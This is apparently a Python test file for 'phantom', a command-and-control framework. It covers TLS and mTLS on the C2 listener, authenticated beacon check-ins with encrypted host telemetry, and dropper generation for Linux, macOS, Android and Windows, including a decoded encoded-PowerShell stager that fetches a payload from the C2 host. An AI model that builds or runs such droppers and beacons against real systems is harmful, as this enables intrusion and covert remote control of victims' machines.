"""A2: TLS end-to-end.

Coverage:
- certs_dir()/certs_exist() helpers
- C2Server generates a self-signed pair on demand and serves HTTPS
- a real HTTPS check-in (encrypted body) works through the listener
- write_beacon_c2_config emits C2_USE_HTTPS 1/0
- generate_dropper switches to https:// and passes the ssl argv flag
- the c2 shell `certs` command reports and uninstalls the pair
"""
import asyncio
import os
import shutil
import tempfile
import time
import unittest

import ssl

from phantom.core.c2_server import C2Server
from phantom.utils import c2_crypto
from phantom.utils.builder import generate_dropper
from phantom.utils.paths import certs_dir, certs_exist


class TestCertsHelpers(unittest.TestCase):

    def test_certs_dir_under_data(self):
        self.assertTrue(certs_dir().endswith(os.path.join("data", "certs")))

    def test_mtls_certs_are_detected(self):
        with tempfile.TemporaryDirectory() as tmp:
            from unittest.mock import patch
            for name in ("mtls_server.crt", "mtls_server.key", "client_ca.crt"):
                open(os.path.join(tmp, name), "w").write("test")
            with patch("phantom.utils.paths.certs_dir", return_value=tmp):
                self.assertTrue(certs_exist())


class TestC2ServerTls(unittest.TestCase):

    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        self.server = C2Server(host="127.0.0.1", port=0, use_ssl=True,
                               cert_dir=self.tmp)

    def tearDown(self):
        self.server.stop()
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_ssl_context_generates_cert_pair(self):
        from unittest.mock import patch
        with patch("phantom.core.c2_server.use_mtls", return_value=False):
            ctx = self.server._get_ssl_context()
            self.assertIsNotNone(ctx)
            self.assertTrue(os.path.exists(os.path.join(self.tmp, "server.crt")))
            self.assertTrue(os.path.exists(os.path.join(self.tmp, "server.key")))

    def test_ssl_context_reuses_existing_pair(self):
        from unittest.mock import patch
        with patch("phantom.core.c2_server.use_mtls", return_value=False):
            ctx1 = self.server._get_ssl_context()
            crt = os.path.join(self.tmp, "server.crt")
            key = os.path.join(self.tmp, "server.key")
            first_crt = open(crt, "rb").read()
            first_key = open(key, "rb").read()
            ctx2 = C2Server(host="127.0.0.1", use_ssl=True, cert_dir=self.tmp)
            with patch("phantom.core.c2_server.use_mtls", return_value=False):
                ctx2._get_ssl_context()
            self.assertEqual(open(crt, "rb").read(), first_crt)
            self.assertEqual(open(key, "rb").read(), first_key)
            self.assertIsNotNone(ctx1)

    def test_no_ssl_context_without_flag(self):
        from unittest.mock import patch
        with patch("phantom.core.c2_server.use_mtls", return_value=False):
            srv = C2Server(host="127.0.0.1", use_ssl=False, cert_dir=self.tmp)
            self.assertIsNone(srv._get_ssl_context())

    def test_mtls_requires_a_configured_ca(self):
        from unittest.mock import patch
        from phantom.utils.beacon_auth import ensure_mtls_material
        # Generate mTLS material first so the CA cert exists
        mtls = ensure_mtls_material(self.tmp, "127.0.0.1")
        with patch("phantom.core.c2_server.use_mtls", return_value=True), \
             patch.dict(os.environ, {"PHANTOM_MTLS_CA": mtls["ca_cert"]}, clear=False):
            mtls_ctx = self.server._get_ssl_context()
            self.assertIsNotNone(mtls_ctx)
            self.assertEqual(mtls_ctx.verify_mode, ssl.CERT_OPTIONAL)

    def test_mtls_client_certificate_roundtrip(self):
        from unittest.mock import patch
        from phantom.utils.beacon_auth import (
            enroll_beacon, issue_client_certificate, sign_request,
        )
        from aiohttp import web
        import aiohttp

        with patch("phantom.core.c2_server.use_mtls", return_value=True), \
             patch("phantom.core.c2_server.beacon_auth_required", return_value=True), \
             patch.dict(os.environ, {
            "PHANTOM_MTLS_CERT_DIR": self.tmp,
            "PHANTOM_BEACON_REGISTRY": os.path.join(self.tmp, "registry.json"),
        }, clear=False):
            server_ctx = self.server._get_ssl_context()
            identity = enroll_beacon("B-MTLS-CLIENT")
            material = issue_client_certificate("B-MTLS-CLIENT", self.tmp)
            client_cert = os.path.join(self.tmp, "client.crt")
            client_key = os.path.join(self.tmp, "client.key")
            open(client_cert, "w", encoding="utf-8").write(material["client_cert_pem"])
            open(client_key, "w", encoding="utf-8").write(material["client_key_pem"])
            client_ctx = ssl.create_default_context(
                cafile=os.path.join(self.tmp, "client_ca.crt"))
            client_ctx.load_cert_chain(client_cert, client_key)

            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)

            async def run():
                app = web.Application()
                app.router.add_get("/api/v1/ping", __import__(
                    "phantom.core.c2_server", fromlist=["handle_checkin"]
                ).handle_checkin)
                runner = web.AppRunner(app)
                await runner.setup()
                site = web.TCPSite(runner, "127.0.0.1", 0, ssl_context=server_ctx)
                await site.start()
                port = site._server.sockets[0].getsockname()[1]
                timestamp = str(int(time.time()))
                nonce = "mtls-test-nonce"
                counter = "1"
                body = ""
                headers = {
                    "X-Beacon-Id": "B-MTLS-CLIENT",
                    "X-Beacon-Timestamp": timestamp,
                    "X-Beacon-Counter": counter,
                    "X-Beacon-Nonce": nonce,
                }
                headers["X-Beacon-Auth"] = sign_request(
                    identity["secret"], "GET", "/api/v1/ping", timestamp,
                    counter, nonce, body,
                )
                async with aiohttp.ClientSession() as session:
                    async with session.get(
                        f"https://127.0.0.1:{port}/api/v1/ping",
                        headers=headers,
                        ssl=client_ctx,
                    ) as response:
                        self.assertEqual(response.status, 200)
                await runner.cleanup()

            try:
                loop.run_until_complete(run())
            finally:
                loop.close()

    def test_https_checkin_roundtrip(self):
        """Start an HTTPS listener on an ephemeral port and drive a beacon
        check-in with an encrypted body over real TLS."""
        self.server._get_ssl_context()
        ctx = self.server._get_ssl_context()

        # Enroll the beacon so auth passes (secure-by-default). The patch
        # must stay active during the whole asyncio run so the handler can
        # find the beacon record.
        from phantom.utils.beacon_auth import enroll_beacon, sign_request
        from unittest.mock import patch
        import time as _time
        registry = os.path.join(self.tmp, "registry.json")
        with patch("phantom.core.c2_server.use_mtls", return_value=False), \
             patch.dict(os.environ, {"PHANTOM_BEACON_REGISTRY": registry}, clear=False):
            identity = enroll_beacon("beacon-tls-1")

            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)

            async def run():
                from aiohttp import web
                import phantom.core.c2_server as mod
                app = web.Application()
                app.router.add_get("/api/v1/ping", mod.handle_checkin)
                app.router.add_post("/api/v1/ping", mod.handle_checkin)
                app.router.add_post("/api/v1/result", mod.handle_result)
                runner = web.AppRunner(app)
                await runner.setup()
                import socket as _s
                s = _s.socket()
                s.bind(("127.0.0.1", 0))
                port = s.getsockname()[1]
                s.close()
                site = web.TCPSite(runner, "127.0.0.1", port, ssl_context=ctx)
                await site.start()

                import aiohttp
                import json as _json
                ssl_ctx = ssl.create_default_context()
                ssl_ctx.check_hostname = False
                ssl_ctx.verify_mode = ssl.CERT_NONE

                from phantom.utils.c2_crypto import encrypt_data, decrypt_data
                ts = str(int(_time.time()))
                nonce_val = "test-nonce-checkin"
                counter_val = "1"
                telemetry = encrypt_data(_json.dumps({
                    "sysinfo": "OS: Linux 5.15\nUser: root\nArch: x64\nHost: test",
                    "netinfo": "IP: 10.0.0.5",
                }))
                base_headers = {
                    "X-Beacon-Id": "beacon-tls-1",
                    "X-Beacon-Timestamp": ts,
                    "X-Beacon-Counter": counter_val,
                    "X-Beacon-Nonce": nonce_val,
                    "X-Beacon-Auth": sign_request(identity["secret"], "POST",
                        "/api/v1/ping", ts, counter_val, nonce_val, telemetry),
                }
                async with aiohttp.ClientSession() as sess:
                    async with sess.post(
                            f"https://127.0.0.1:{port}/api/v1/ping",
                            data=telemetry,
                            headers=base_headers,
                            ssl=ssl_ctx) as resp:
                        self.assertEqual(resp.status, 200)
                        body = await resp.text()
                        decrypted = decrypt_data(body)
                        self.assertIn("tasks", decrypted)
                    result_ts = str(int(_time.time()))
                    result_nonce = "test-nonce-result"
                    result_counter = "2"
                    result_body = encrypt_data(_json.dumps({
                        "task_id": "t-1", "output": "PERSISTENCE_OK"}))
                    result_headers = {
                        "X-Beacon-Id": "beacon-tls-1",
                        "X-Beacon-Timestamp": result_ts,
                        "X-Beacon-Counter": result_counter,
                        "X-Beacon-Nonce": result_nonce,
                        "X-Beacon-Auth": sign_request(identity["secret"], "POST",
                            "/api/v1/result", result_ts, result_counter,
                            result_nonce, result_body),
                    }
                    async with sess.post(
                            f"https://127.0.0.1:{port}/api/v1/result",
                            data=result_body,
                            headers=result_headers,
                            ssl=ssl_ctx) as resp:
                        self.assertEqual(resp.status, 200)
                await runner.cleanup()

            try:
                loop.run_until_complete(run())
            finally:
                loop.close()

            from phantom.core.c2_server import c2_state as _c2s
            beacons = _c2s.get_beacons()
            bid = [b for b in beacons if "beacon-tls-1" in b][0]
            self.assertEqual(beacons[bid]["os"], "Linux 5.15")
            results = _c2s.get_results(bid)
            self.assertEqual(results[0]["output"], "PERSISTENCE_OK")


class TestBeaconTlsConfig(unittest.TestCase):

    def test_write_beacon_c2_config_https(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = c2_crypto.write_beacon_c2_config(
                tmp, host="10.0.0.1", port=8443, use_ssl=True)
            content = open(path).read()
            self.assertIn('#define C2_USE_HTTPS 1', content)
            self.assertIn('#define C2_HOST "10.0.0.1"', content)
            self.assertIn('#define C2_PORT 8443', content)

    def test_write_beacon_c2_config_http(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = c2_crypto.write_beacon_c2_config(
                tmp, host="10.0.0.1", port=8080, use_ssl=False)
            content = open(path).read()
            self.assertIn('#define C2_USE_HTTPS 0', content)

    def test_dropper_https_url_and_flag(self):
        for platform in ("linux", "macos", "android"):
            plain = generate_dropper(platform, "10.0.0.1", 443, use_ssl=False)
            tls = generate_dropper(platform, "10.0.0.1", 443, use_ssl=True)
            self.assertIn("http://10.0.0.1:443", plain)
            self.assertIn("https://10.0.0.1:443", tls)
            self.assertIn("443 0", plain)
            self.assertIn("443 1", tls)

    def test_windows_dropper_https(self):
        import base64
        tls = generate_dropper("windows", "10.0.0.1", 443, use_ssl=True)
        encoded = tls.split("-Enc ")[1]
        decoded = base64.b64decode(encoded).decode("utf-16-le")
        # the PIC stager includes the authenticated payload-delivery token
        self.assertIn("https://10.0.0.1:443/x?auth=", decoded)


class TestCertsShellCommand(unittest.TestCase):

    def _shell(self):
        from phantom.core.c2_shell import C2Shell
        return C2Shell()

    def test_certs_uninstall_removes_pair(self):
        sh = self._shell()
        with tempfile.TemporaryDirectory() as tmp:
            from unittest.mock import patch
            with patch("phantom.core.c2_shell.certs_dir", return_value=tmp):
                os.makedirs(tmp, exist_ok=True)
                crt = os.path.join(tmp, "server.crt")
                key = os.path.join(tmp, "server.key")
                open(crt, "w").write("crt")
                open(key, "w").write("key")
                sh.do_certs("uninstall")
                self.assertFalse(os.path.exists(crt))
                self.assertFalse(os.path.exists(key))

    def test_certs_status_no_crash_when_missing(self):
        sh = self._shell()
        with tempfile.TemporaryDirectory() as tmp:
            from unittest.mock import patch
            with patch("phantom.core.c2_shell.certs_dir", return_value=tmp):
                sh.do_certs("")  # status path with no certs -> warn, no crash


if __name__ == "__main__":
    unittest.main()
